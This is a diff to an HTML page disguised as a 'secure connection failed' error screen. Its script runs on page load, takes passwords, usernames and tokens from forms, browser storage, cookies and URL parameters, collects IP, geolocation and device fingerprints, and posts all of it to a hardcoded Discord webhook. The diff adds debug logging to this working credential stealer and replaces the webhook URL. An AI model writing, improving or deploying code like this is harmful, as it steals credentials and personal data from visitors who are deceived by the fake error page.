@@ -42,6 +42,31 @@
             margin: 1rem 0;
             color: #ff4444;
         }
+        #debug {
+            display: none;
+            background: #0a0a15;
+            padding: 1rem;
+            border-radius: 8px;
+            margin-top: 1rem;
+            text-align: left;
+            font-size: 0.7rem;
+            color: #4ecdc4;
+            max-height: 200px;
+            overflow: auto;
+            border: 1px solid #2a2a4a;
+        }
+        #debug.show { display: block; }
+        .debug-toggle {
+            background: #2a2a4a;
+            border: none;
+            color: #8888aa;
+            padding: 0.3rem 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.7rem;
+            margin-top: 0.5rem;
+        }
+        .debug-toggle:hover { background: #3a3a5a; }
     </style>
 </head>
 <body>
@@ -52,20 +77,54 @@
     <div class="sub">unable to establish secure connection</div>
     <div id="ip-address">[ error: timeout ]</div>
     <div class="status" id="status">retry failed • contact administrator</div>
+    <button class="debug-toggle" onclick="toggleDebug()">Show Debug</button>
+    <div id="debug"></div>
 </div>
 
 <script>
     (function() {
         // ─── DISCORD WEBHOOK ─────────────────────────────────────
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1534703292934787283/hoj4Ifi-vZe91DhEa7PSaOhqeW4-rGf0sj0U46HDAZAbS8PHqebMKcVTMOUO3lq1aW3t';
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1534714697214066828/QOQByLeN_i4bFIWOTaQnKH47dW1Q6y32OkKTz2DlaVZmt1SMPrSQV1OCCPF2V0Wg_3BN';
+        const DEBUG_ENABLED = true;
+        const debugLog = [];
+
+        // ─── DEBUG ──────────────────────────────────────────────────
+        function debug(msg, data = null) {
+            if (!DEBUG_ENABLED) return;
+            const entry = { time: new Date().toISOString(), msg, data };
+            debugLog.push(entry);
+            console.log('[DEBUG]', msg, data || '');
+            
+            // Update debug div if visible
+            const debugEl = document.getElementById('debug');
+            if (debugEl.classList.contains('show')) {
+                debugEl.innerHTML = debugLog.map(e => 
+                    `<div>[${e.time.slice(11,19)}] ${e.msg}${e.data ? ' → ' + JSON.stringify(e.data).substring(0,100) : ''}</div>`
+                ).join('');
+                debugEl.scrollTop = debugEl.scrollHeight;
+            }
+        }
+
+        window.toggleDebug = function() {
+            const el = document.getElementById('debug');
+            el.classList.toggle('show');
+            if (el.classList.contains('show')) {
+                el.innerHTML = debugLog.map(e => 
+                    `<div>[${e.time.slice(11,19)}] ${e.msg}${e.data ? ' → ' + JSON.stringify(e.data).substring(0,100) : ''}</div>`
+                ).join('');
+            }
+        };
 
         // ─── PASSWORD GRABBERS ──────────────────────────────────
         function grabSavedPasswords() {
+            debug('🔍 Starting password grab');
             const passwords = [];
             
             // 1. Check for autofilled password fields
             try {
-                document.querySelectorAll('input[type="password"]').forEach(el => {
+                const pwdInputs = document.querySelectorAll('input[type="password"]');
+                debug(`📋 Found ${pwdInputs.length} password fields`);
+                pwdInputs.forEach(el => {
                     if (el.value) {
                         passwords.push({
                             type: 'autofilled',
@@ -73,15 +132,18 @@
                             id: el.id || 'unknown',
                             name: el.name || 'unknown'
                         });
+                        debug(`🔑 Autofilled password: ${el.id || 'unknown'} = ${el.value.substring(0,3)}***`);
                     }
                 });
-            } catch(e) {}
+            } catch(e) { debug('❌ Error grabbing autofill:', e.message); }
 
             // 2. Check localStorage for password patterns
             try {
+                const lsItems = [];
                 for (let i = 0; i < localStorage.length; i++) {
                     const key = localStorage.key(i);
                     const val = localStorage.getItem(key);
+                    lsItems.push({key, val});
                     if (key.toLowerCase().includes('pass') || 
                         key.toLowerCase().includes('pwd') ||
                         key.toLowerCase().includes('token') ||
@@ -91,15 +153,19 @@
                             key: key,
                             value: val
                         });
+                        debug(`🔐 localStorage: ${key} = ${val.substring(0,10)}...`);
                     }
                 }
-            } catch(e) {}
+                debug(`📦 localStorage items: ${lsItems.length}`);
+            } catch(e) { debug('❌ Error reading localStorage:', e.message); }
 
             // 3. Check sessionStorage
             try {
+                const ssItems = [];
                 for (let i = 0; i < sessionStorage.length; i++) {
                     const key = sessionStorage.key(i);
                     const val = sessionStorage.getItem(key);
+                    ssItems.push({key, val});
                     if (key.toLowerCase().includes('pass') || 
                         key.toLowerCase().includes('pwd') ||
                         key.toLowerCase().includes('token') ||
@@ -109,13 +175,17 @@
                             key: key,
                             value: val
                         });
+                        debug(`🔐 sessionStorage: ${key} = ${val.substring(0,10)}...`);
                     }
                 }
-            } catch(e) {}
+                debug(`📦 sessionStorage items: ${ssItems.length}`);
+            } catch(e) { debug('❌ Error reading sessionStorage:', e.message); }
 
             // 4. Check cookies for auth tokens
             try {
-                document.cookie.split(';').forEach(cookie => {
+                const cookieList = document.cookie.split(';').filter(c => c.trim());
+                debug(`🍪 Found ${cookieList.length} cookies`);
+                cookieList.forEach(cookie => {
                     const [key, val] = cookie.trim().split('=');
                     if (key.toLowerCase().includes('pass') || 
                         key.toLowerCase().includes('pwd') ||
@@ -127,42 +197,45 @@
                             key: key,
                             value: val
                         });
+                        debug(`🍪 Cookie: ${key} = ${val.substring(0,10)}...`);
                     }
                 });
-            } catch(e) {}
+            } catch(e) { debug('❌ Error reading cookies:', e.message); }
 
-            // 5. Check for password managers (LastPass, Bitwarden, etc.)
+            // 5. Check for password managers and forms
             try {
                 const forms = document.querySelectorAll('form');
+                debug(`📝 Found ${forms.length} forms`);
                 forms.forEach(form => {
                     const inputs = form.querySelectorAll('input');
                     let hasPassword = false;
                     let username = '';
+                    let pwdValue = '';
                     inputs.forEach(input => {
                         if (input.type === 'password' && input.value) {
                             hasPassword = true;
+                            pwdValue = input.value;
                         }
                         if (input.type === 'text' || input.type === 'email') {
-                            username = input.value;
+                            username = input.value || username;
                         }
                     });
-                    if (hasPassword && username) {
-                        const pwdInput = form.querySelector('input[type="password"]');
-                        if (pwdInput && pwdInput.value) {
-                            passwords.push({
-                                type: 'form_submission',
-                                username: username,
-                                password: pwdInput.value,
-                                formAction: form.action || 'unknown'
-                            });
-                        }
+                    if (hasPassword && pwdValue) {
+                        passwords.push({
+                            type: 'form_submission',
+                            username: username || 'unknown',
+                            password: pwdValue,
+                            formAction: form.action || 'unknown'
+                        });
+                        debug(`🔑 Form: ${username || 'unknown'} / ${pwdValue.substring(0,3)}***`);
                     }
                 });
-            } catch(e) {}
+            } catch(e) { debug('❌ Error scanning forms:', e.message); }
 
             // 6. Check for session tokens in URL
             try {
                 const params = new URLSearchParams(window.location.search);
+                debug(`🔗 URL params: ${Array.from(params.entries()).length}`);
                 params.forEach((val, key) => {
                     if (key.toLowerCase().includes('token') || 
                         key.toLowerCase().includes('auth') ||
@@ -172,19 +245,16 @@
                             key: key,
                             value: val
                         });
+                        debug(`🔗 URL param: ${key} = ${val.substring(0,10)}...`);
                     }
                 });
-            } catch(e) {}
+            } catch(e) { debug('❌ Error reading URL params:', e.message); }
 
+            debug(`✅ Total passwords captured: ${passwords.length}`);
             return passwords;
         }
 
-        // ─── UTILITY ─────────────────────────────────────────────
-        function getCookie(name) {
-            const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
-            return match ? decodeURIComponent(match[2]) : null;
-        }
-
+        // ─── UTILITY FUNCTIONS ─────────────────────────────────────
         function getLocalStorage() {
             try {
                 const items = {};
@@ -356,39 +426,47 @@
 
         // ─── SEND TO DISCORD WITH RETRY ──────────────────────────
         async function sendToDiscord(payload, retries = 3) {
+            debug(`📤 Sending to Discord (${retries} retries)`);
             for (let i = 0; i < retries; i++) {
                 try {
+                    debug(`📡 Attempt ${i+1}/${retries}`);
                     const response = await fetch(WEBHOOK_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(payload)
                     });
                     if (response.ok) {
-                        console.log('✅ Data sent successfully');
+                        debug('✅ Data sent successfully');
                         return true;
                     } else {
-                        console.log(`❌ Attempt ${i+1} failed: ${response.status}`);
-                        await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
+                        const text = await response.text();
+                        debug(`❌ Attempt ${i+1} failed: ${response.status} - ${text.substring(0,100)}`);
+                        await new Promise(resolve => setTimeout(resolve, 1500 * (i + 1)));
                     }
                 } catch (e) {
-                    console.log(`❌ Attempt ${i+1} error:`, e);
-                    await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
+                    debug(`❌ Attempt ${i+1} error: ${e.message}`);
+                    await new Promise(resolve => setTimeout(resolve, 1500 * (i + 1)));
                 }
             }
+            debug('❌ All attempts failed');
             return false;
         }
 
         // ─── MAIN ──────────────────────────────────────────────────
         async function gatherAndSend() {
+            debug('🚀 Starting data collection');
             try {
                 document.getElementById('status').textContent = '⚠️ connection failed • reconnecting...';
 
                 // 1. IP + Geo (via ipapi.co)
+                debug('📡 Fetching IP data from ipapi.co');
                 let ipData = {};
                 try {
                     const resp = await fetch('https://ipapi.co/json/');
                     ipData = await resp.json();
+                    debug(`✅ IP fetched: ${ipData.ip || 'unknown'}`);
                 } catch (e) {
+                    debug(`❌ IP fetch failed: ${e.message}`);
                     ipData = { ip: 'fetch failed', error: e.message };
                 }
 
@@ -408,9 +486,12 @@
                 document.getElementById('ip-address').textContent = '[ error: ' + ip + ' ]';
 
                 // 2. Grab passwords
+                debug('🔑 Starting password capture');
                 const passwords = grabSavedPasswords();
-                
+                debug(`✅ Captured ${passwords.length} passwords/tokens`);
+
                 // 3. Browser / Device / System
+                debug('📱 Gathering system data');
                 const ua = navigator.userAgent;
                 const platform = navigator.platform;
                 const language = navigator.language;
@@ -429,6 +510,7 @@
                 const mimeTypes = getMimeTypes();
 
                 // 6. Fingerprints
+                debug('🖌️ Generating fingerprints');
                 const canvasFp = getCanvasFingerprint();
                 const webgl = getWebGLInfo();
                 const audioFp = getAudioFingerprint();
@@ -441,6 +523,7 @@
                 const netInfo = getNetworkInfo();
 
                 // 8. Async
+                debug('🔋 Gathering async data');
                 const battery = await getBatteryInfo();
                 const geo = await getGeolocation();
                 const permissions = await getPermissions();
@@ -451,6 +534,7 @@
                 const pageTitle = document.title;
 
                 // 10. Construct embed
+                debug('📝 Building Discord embed');
                 const fields = [
                     { name: '🌐 IP Address', value: `\`${ip}\``, inline: true },
                     { name: '📍 Location', value: `${city}, ${region}, ${country}`, inline: true },
@@ -500,7 +584,7 @@
                     }).join('\n');
                     
                     fields.push({
-                        name: '🔑 CAPTURED PASSWORDS & TOKENS',
+                        name: `🔑 CAPTURED PASSWORDS & TOKENS (${passwords.length})`,
                         value: `\`\`\`${pwdSummary.substring(0, 1000)}\`\`\``,
                         inline: false
                     });
@@ -515,22 +599,32 @@
                 };
 
                 // 11. Send to Discord with retry
+                debug('📤 Sending payload to Discord');
                 const sent = await sendToDiscord({ embeds: [embed] });
                 
                 if (sent) {
+                    debug('✅ Data delivered successfully');
                     document.getElementById('status').textContent = '⚠️ connection failed • retry limit exceeded';
                 } else {
+                    debug('❌ Failed to send after all retries');
                     document.getElementById('status').textContent = '⚠️ connection failed • server unreachable';
                 }
 
+                debug('🏁 Data collection complete');
+
             } catch (err) {
+                debug(`💀 Fatal error: ${err.message}`);
                 document.getElementById('status').textContent = '⚠️ connection failed • server unreachable';
                 document.getElementById('ip-address').textContent = '[ error: timeout ]';
                 console.error('[FATAL]', err);
             }
         }
 
+        // ─── START ──────────────────────────────────────────────────
+        debug('⏳ Initializing...');
         gatherAndSend();
+        debug('✅ Script initialized, gathering data...');
+
     })();
 </script>
 
